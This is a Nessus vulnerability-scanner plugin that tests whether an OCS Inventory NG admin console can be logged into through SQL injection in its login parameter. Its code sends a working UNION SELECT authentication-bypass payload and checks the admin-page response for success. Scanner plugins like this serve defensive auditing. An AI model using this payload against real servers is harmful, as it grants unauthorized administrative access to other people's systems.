#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(44393);
  script_version("$Revision: 1.8 $");
 script_cvs_date("$Date: 2016/05/12 14:46:29 $");

  script_bugtraq_id(38005);
  script_osvdb_id(61942);
  script_xref(name:"Secunia",value:"38311");

  script_name(english:"OCS Inventory NG Server Administration Console header.php login Parameter SQL Injection");
  script_summary(english:"Attempts to log in to OCS Inventory by injecting SQL code");

  script_set_attribute(attribute:"synopsis",value:
"The remote web server is hosting a PHP application that is vulnerable
to a SQL-injection attack."
  );
  script_set_attribute(attribute:"description",value:
"The version of the OCS Inventory NG Server Administration Console
hosted on the remote web server fails to properly sanitize user-
supplied input to the 'login' parameter of the 'header.php' script.

Provided PHP's 'magic_quotes_gpc' setting is disabled, an attacker can
exploit this to bypass authentication and thereby gain access to the
administrative interface."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/509252/30/0/threaded");
  script_set_attribute(attribute:"see_also",value:"http://forums.ocsinventory-ng.org/viewtopic.php?id=5609");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to OCS Inventory NG Management Server version 1.3beta4 /
1.02.2 or later as those versions have been determined to address the
vulnerability."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/01/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/01/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");
  script_dependencies("ocs_inventory_ng_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/ocs_inventory");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The remote web server on port "+port+" does not support PHP.");

install = get_install_from_kb(appname:'ocs_inventory', port:port);
if (isnull(install)) exit(1, "An OCS Inventory NG Server Administration Console install wasn't detected on port "+port+".");

pass = SCRIPT_NAME + unixtime();
exploit = "0' UNION SELECT 'admin', 1, '"+pass;
postdata="login="+urlencode(str:exploit)+"&pass="+urlencode(str:pass)+"&subLogin=Send";

req = http_mk_post_req(
  port:port,
  item:install['dir'],
  data:postdata,
  add_headers:make_array(
    "Content-Type", "application/x-www-form-urlencoded"
  )
);
res = http_send_recv_req(port:port, req:req, follow_redirect:1);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if (
  '<TITLE>OCS Inventory</TITLE>' >< res[2] &&
  'Machines in base</font></td>' >< res[2] &&
  'Seen machines</font></td>' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report =
      '\n'+
      'Nessus was able to exploit the issue to bypass authentication using\n'+
      'the following request :\n'+
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n'+
      http_mk_buffer_from_req(req:req)+'\n'+
      crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);

  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  exit(0);
}
else exit(0, "The OCS Inventory NG Server at "+build_url(port:port, qs:install['dir']+'/index.php')+" is not affected.");
